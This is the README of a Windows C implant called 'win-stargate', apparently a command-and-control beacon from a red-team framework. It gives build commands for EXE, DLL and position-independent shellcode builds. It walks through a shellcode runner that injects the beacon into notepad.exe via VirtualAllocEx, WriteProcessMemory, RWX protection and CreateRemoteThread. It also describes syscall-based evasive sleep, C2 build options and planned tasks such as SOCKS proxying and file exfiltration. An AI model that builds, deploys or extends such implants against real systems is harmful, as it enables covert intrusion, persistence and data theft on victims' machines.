# win-stargate (Windows C implant)

Self-contained Stargate-based beacon: **`stargate/`** (vendored T2005 C/asm), **`src/`** (beacon + entries + PIC glue), and **`exports_beacon.def`** for the DLL.

## Build (Linux, MinGW)

```bash
make            # beacon.exe
make dll        # beacon.dll
make raw        # beacon.bin (flat image, no PE)
make all        # exe + dll + raw + runner
make runner     # tools/shellcode_runner.exe
```

Requires `x86_64-w64-mingw32-gcc` and `make` on `PATH`.

## Test shellcode on a Windows lab machine

`beacon.bin` is a **position-independent** flat image: `objcopy` of the merged `.text` (short `jmp` at offset 0 to `shellcode_entry`). Injectors that map at an OS-chosen base and run **offset 0** are the intended consumers — including [hollow_rs](https://github.com/Teach2Breach/hollow_rs/blob/main/src/lib.rs) and **windows_noldr** `inject` (`NtMapViewOfSection` + `NtQueueApcThread` + `NtAlertResumeThread`).

The blob writes `.data`/`.bss` at runtime. **windows_noldr** maps the remote view **RX**; `shellcode_entry` calls `NtProtectVirtualMemory` to **RWX** on its own mapping before C2. Lab **`shellcode_runner.exe`** allocates **RW**, copies, then **`VirtualProtectEx` RWX**, and uses **`CreateRemoteThread`** (Notepad is not alertable, so a raw **`QueueUserAPC`** often never runs).

Sleep: **PE** (`beacon.exe` / `beacon.dll`) uses **BM-T6001 Morpheus** (direct NT syscalls). **PIC** (`beacon.bin`) uses **BM-T6003 Deferral Mosaic** (hashed ntdll/kernel32 waits — timer-queue, keyed event, `NtWaitForSingleObject` with timeout). Neither path calls kernel32 `Sleep`.

**`shellcode_runner.exe`** (host **`notepad.exe`** suspended): **`VirtualAllocEx(NULL)`** → **`WriteProcessMemory`** → **`VirtualProtectEx` RWX** → **`CreateRemoteThread`(base+0)** → **`ResumeThread`**.

1. Build **`make raw`** and **`make runner`** (or copy artifacts).
2. Copy **`tools\shellcode_runner.exe`** and **`beacon.bin`**.
3. Run:

```text
tools\shellcode_runner.exe beacon.bin
```

Optional: pass another path as **`argv[1]`**. There are no sidecars or hex offsets.

### Raw (`beacon.bin`) silent failures vs EXE

Production **`make raw`** uses **`PIC_C2_TRACE=0`**, so WinHTTP and registration errors do not appear on the console (the EXE build emits **`[tempest c2]`** on stderr by default). If **`shellcode_runner`** runs but the server never sees a check-in, enable trace and use **Sysinternals DbgView** (Capture Win32):

- **Operator GUI (*conduit_gui*)**: Build dialog → check **“PIC C2 trace (windows raw only — Sysinternals DbgView)”**, set format to **`raw`**, build — the server passes **`PIC_C2_TRACE=1`** into `make raw`.
- **CLI / curl**: `POST /build_imp` with header **`X-Pic-C2-Trace: 1`** (only affects **`X-Format: raw`**).
- **Manual on build host**: `make raw PIC_C2_TRACE=1` with the same **`AES_KEY`** / **`SERVER`** / … env as Anvil.

Ship artifacts built with **`PIC_C2_TRACE=0`** (default).

## Threading and parity (vs. `windows_noldr`)

The C beacon is **single-threaded** for the C2 loop and task execution so far. The legacy Rust implant (`imps/windows_noldr`, `proto.rs`) already had a **second thread** for **SOCKS** (`mpsc` + `thread::spawn`) plus many tasks: `whoami`, `ipconfig`, `ps`, shell fs (`cd`/`pwd`/`ls`/`catfile`), `getfile`/`sendfile`, `cmd`/`pwsh`, `wmi`, `bof`, `inject`, `runpe`, `socks`, live `sleep`, `kill`. When you add those here, expect to **spawn worker threads** for anything that blocks (SOCKS, long jobs) and keep the **main thread** on the HTTP poll, or use explicit queuing. **Do not** share `g_c2coll` / Morpheus / Mosaic context across threads without synchronization.
